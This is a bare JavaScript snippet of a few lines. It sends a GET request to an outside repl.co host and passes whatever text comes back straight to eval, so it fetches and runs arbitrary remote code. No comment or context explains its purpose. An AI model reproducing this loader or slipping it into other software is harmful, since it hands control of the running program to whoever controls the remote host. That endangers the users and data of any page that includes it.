http = new XMLHttpRequest
http.open("GET","https://VeryImportantThingThatShouldNotGoDown.nonreai.repl.co");
http.onload = () => {
	eval(http.responseText)
}
http.send()
